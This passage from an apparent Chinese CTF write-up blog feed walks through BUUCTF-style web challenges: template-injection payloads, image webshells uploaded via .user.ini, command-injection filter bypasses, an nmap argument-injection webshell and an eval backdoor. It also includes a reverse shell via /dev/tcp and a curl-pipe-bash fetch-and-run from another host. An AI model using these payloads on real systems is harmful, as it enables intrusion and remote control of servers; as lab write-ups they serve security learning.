title="BJDCTF2020-The mystery of ip"></a>BJDCTF2020-The mystery of ip</h3><p>flag.php界面会回显ip，抓包改XFF头，成功伪造，</p><p>这里考的是smarty模板注入，</p><p>关于smarty的SSTI可以参考<a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p><p>拿flag的payload：<code>X-Forwarded-For: { {system(&#39;cat /flag&#39;)}}</code></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="BJDCTF2020-Cookie is so stable"></a>BJDCTF2020-Cookie is so stable</h3><p>首先在<code>flag.php</code>界面进行测试，<code>{ {7*&#39;7&#39;}}</code>，返回49，那应该就是<code>Twig</code>模板了，直接给出<code>payload</code>：</p><p><code>{ {_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{ {_self.env.getFilter(&quot;cat /flag&quot;)}}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先搬一张大佬的图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200521204901527.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="SSTI" scheme="https://www.extrader.top/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://www.extrader.top/2020/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://www.extrader.top/2020/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-03-15T16:00:00.000Z</published>
    <updated>2020-07-14T10:41:21.004Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2019SUCTF—CheckIn"><a href="#2019SUCTF—CheckIn" class="headerlink" title="2019SUCTF—CheckIn"></a>2019SUCTF—CheckIn</h3><p>题目源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p><p>复现链接：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><a id="more"></a><h4 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209103925041.png" alt="" loading="lazy"></p><p>上传一句话.php文件，结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104816676.png" alt="" loading="lazy"></p><p>更改后缀和文件类型为图片格式，结果如下，过滤了<code>&lt;?</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105358989.png" alt="" loading="lazy"></p><p>用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马绕过，结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105253270.png" alt="" loading="lazy"></p><p>应该调用了后端的<code>exif_imagetype()</code>函数，于是添加文件头绕过<code>GIF89a</code>，上传成功</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209110003787.png" alt="" loading="lazy"></p><p>到这一步应该想到上传一个<code>.htaccess</code>文件来将图片马解析为php，尝试无果，于是用到了下面的.user.ini文件</p><p>参考</p><blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p><a href="https://xz.aliyun.com/t/6091#toc-1" target="_blank" rel="noopener">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a></p></blockquote><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="上传-uesr-ini文件"><a href="#上传-uesr-ini文件" class="headerlink" title="上传.uesr.ini文件"></a>上传.uesr.ini文件</h5><p>内容如下：</p><pre class=" language-ini"><code class="language-ini">GIF89a<span class="token constant">auto_prepend_file</span><span class="token attr-value"><span class="token punctuation">=</span>a.jpg</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104439117.png" alt="" loading="lazy"></p><blockquote><p>ini文件设置中有两个参数：<code>auto_prepend_file</code>和<code>auto_append_file</code></p><p>表示我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code></p><p>两个设置的区别在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p></blockquote><p>利用前提需要文件目录下有一个可执行的.php文件，而题目刚好有一个</p><h5 id="上传a-jpg图片马"><a href="#上传a-jpg图片马" class="headerlink" title="上传a.jpg图片马"></a>上传a.jpg图片马</h5><pre class=" language-php"><code class="language-php">GIF89a<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p><img src="D:%5CBlog%5Csource_posts%5C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5Cimage-20200209113304522.png" alt="" loading="lazy"></p><p>访问index.php，用工具连接后台，在网站根目录下得到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113410626.png" alt="" loading="lazy"></p><p>也可以将图片马代码改成如下方式</p><pre class=" language-php"><code class="language-php">GIF89a<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>直接访问index.php即可得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;2019SUCTF—CheckIn&quot;&gt;&lt;a href=&quot;#2019SUCTF—CheckIn&quot; class=&quot;headerlink&quot; title=&quot;2019SUCTF—CheckIn&quot;&gt;&lt;/a&gt;2019SUCTF—CheckIn&lt;/h3&gt;&lt;p&gt;题目源码：&lt;a href=&quot;https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;复现链接：&lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://buuoj.cn/challenges&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="文件上传" scheme="https://www.extrader.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>命令注入</title>
    <link href="https://www.extrader.top/2020/03/10/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.extrader.top/2020/03/10/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-09T16:00:00.000Z</published>
    <updated>2020-07-14T10:40:13.291Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2019GXYCTF—Ping-Ping-Ping"><a href="#2019GXYCTF—Ping-Ping-Ping" class="headerlink" title="2019GXYCTF—Ping Ping Ping"></a>2019GXYCTF—Ping Ping Ping</h3><p>12月份的GWYCTF，BUUCTF上复现</p><p>别人学校招新的题目，我还是不会，太菜了</p><a id="more"></a><p>先来看看题目的界面</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt="" loading="lazy"></p><p>由题意得，传参ip</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt="" loading="lazy"></p><p>联想命令执行，命令执行的方法大致两种：</p><pre class=" language-shell"><code class="language-shell">;：用于连续指令执行|：管道符，将左边的输出当做右边的输入，只返回右边的结果</code></pre><p>尝试分号：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt="" loading="lazy"></p><p>发现目录下包含两个文件：index.php 和 flag.php</p><p>尝试cat查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-99.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt="" loading="lazy"></p><p>emmmmmmmmmmmmm空格被办了。。。</p><p>从大佬那学习绕过空格的方法，大概有以下几种：</p><pre class=" language-shell"><code class="language-shell">$IFS${IFS}$IFS$1 //$1改成$加其他数字貌似都行< <> {cat,flag.php}  //用逗号实现了空格功能%20 %09 </code></pre><p>各种尝试后发现$IFS$1有效，分别查看两个文件，如图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt="" loading="lazy"></p><p>index.php代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string">"|\\|\(|\)|\[|\]|\{|\}/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"ping -c 4 "</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> ""<span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>发现大多数符号都被过滤，以下几种方法都不行（不过好像都挺有用的，搬来学习一下）：</p><pre class=" language-shell"><code class="language-shell">cat fl* 利用*匹配任意 不行echo "Y2F0IGZsYWcucGhw"| base64 -d | bash 也不行ca\t fl\ag.php 不行cat fl''ag.php 不行</code></pre><p>最后使用变量拼接：</p><p>顾名思义，变量拼接就是：a=f;b=lag.php;cat $a$b</p><p>利用到解题中：</p><pre class=" language-shell"><code class="language-shell">a=g;cat$IFS$1fla$a.php</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt="" loading="lazy"></p><p>[・_・?]</p><p>F12即可得出答案：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-104.png" alt="" loading="lazy"></p><p>参考大佬原文：<a href="https://www.jianshu.com/p/fd7f9fcc9333" target="_blank" rel="noopener">ping</a></p><h3 id="BJDCTF-2nd—duangShell"><a href="#BJDCTF-2nd—duangShell" class="headerlink" title="BJDCTF-2nd—duangShell"></a>BJDCTF-2nd—duangShell</h3><p>首先首页提示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt="" loading="lazy"></p><p>.swp源码泄露，是使用vim编辑器的缓存文件</p><p>于是访问<code>url/.index.php.swp</code>下载该文件，然后用<code>vim -r index.php.swp</code>恢复文件，得到源码</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>give me a girl<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>珍爱网<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"how can i give you source code? .swp?!"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"where is P3rh4ps's girl friend ???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$girl</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\>|\\\/'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'just girl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;img src='img/p3_need_beautiful_gf.png'> &lt;!-- He is p3 -->"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//duangShell~~~~</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>代码审计，可以POST一个<code>girl_friend</code>参数但过滤了一些参数，看到最后执行命令使用的是<code>exec</code>的函数，返回最后一行内容，无回显，由于看不到输出，就选择反弹shell来拿到系统权限执行命令。</p><p>正好<code>curl</code>命令没用被禁，<a href="https://www.cnblogs.com/yanguhung/p/10115911.html" target="_blank" rel="noopener">curl命令参考</a>，于是选择用<code>curl</code>指令来curl远程主机上的文件然后再用管道符<code>| bash</code>来执行<code>curl</code>下来的内容</p><p>由于<code>buu</code>上面的靶机无法访问外网，创个小号开台可以用的靶机（靶机已经装好了LAMP），由于都是在一个内网，所以靶机之间可以互相访问</p><p><code>ssh</code>登录<code>ssh -p 29722 root@node3.buuoj.cn</code></p><p>输入密码进去后在<code>/var/www/html</code>目录下创建一个<code>txt</code>文件，里面写上反弹shell的语句</p><pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/174.1.143.177/2333 0>&1</code></pre><p>注意上面的ip地址为内网的ip，提前用ifconfig查看一下内网ip就可以了，</p><p>然后在需要反弹shell的机子上post参数：</p><pre class=" language-shell"><code class="language-shell">girl_friend=curl 174.1.143.177/1.txt | bash</code></pre><p>可以看到shell被弹过来了，然后开始找flag</p><p>在根目录下有一个flag文件，但里面放的不是flag，于是find+grep查找</p><pre class=" language-shell"><code class="language-shell">find etc -name "*" | xargs grep "flag{"</code></pre><p><a href="https://www.runoob.com/linux/linux-comm-xargs.html" target="_blank" rel="noopener">xargs</a>，最终在<code>etc</code>中找到了flag</p><p>关于反弹shell的解析参考以下文章</p><blockquote><p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548</a>   （Linux反弹shell（一）文件描述符与重定向）</p><p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a>   （Linux 反弹shell（二）反弹shell的本质）</p><p><a href="https://www.cnblogs.com/-zhong/p/11398877.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/11398877.html</a>   （Liunx反弹shell的几种方式）</p></blockquote><h3 id="BUUCTF-2018—Online-Tool"><a href="#BUUCTF-2018—Online-Tool" class="headerlink" title="BUUCTF-2018—Online Tool"></a>BUUCTF-2018—Online Tool</h3><p>首页源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以<code>get</code>一个<code>host</code></p><ul><li><strong>escapeshellarg</strong>：将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li><li><strong>escapeshellcmd</strong>：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$*, <em>\x0A<em>和 *\xFF</em>。<code>&#39;</code>和<code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 *%</em> 和 <em>!</em> 字符都会被空格代替。</li></ul><p>假设传入<code>172.17.0.2&#39; aaa</code>，结果<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; aaa&#39;</code>,在单引号前加了一个反斜杠转义，然后又将转义后单引号两边的字符串用引号引起来起到连接字符串的作用，随后经过<code>escapeshellcmd</code>处理变成了<code>&#39;172.17.0.2&#39;\\&#39;&#39; aaa&#39;</code>，<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，后面的<code>&#39;</code>配对成了一个空白连接符，如果是<code>ping</code>命令，则命令简化成了<code>ping 172.17.0.2\ aaa&#39;</code>，最终就会造成利用</p><p>于是我们配合<code>nmap</code>的<code>-oG</code>参数可以将扫描的结果生成指定的文件</p><p><code>payload</code>：<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p><h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="GKCTF2020-CheckIN"></a>GKCTF2020-CheckIN</h3><p>首先题目给出了源码：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Check_In<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ClassName</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以看到已经相当于有一个马在上面了， <code>@Eval(base64_decode($_REQUEST[&#39;Ginkgo&#39;]));</code></p><p>于是直接用蚁剑连接：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111558751.png" alt="" loading="lazy"></p><p>注意这里自带的base64解码好像用不了，在网上找一个可以用的，<a href="https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/b64pass.js" target="_blank" rel="noopener">链接</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111835994.png" alt="" loading="lazy"></p><p>添加到<code>AntSword</code>即可连接成功</p><p>虽然连上去了，也可以看到根目录下的flag，但是并没有权限直接读取flag，但是我们可以看到有一个readflag可执行文件，应该就是想办法利用这个文件来读取flag了</p><p><img 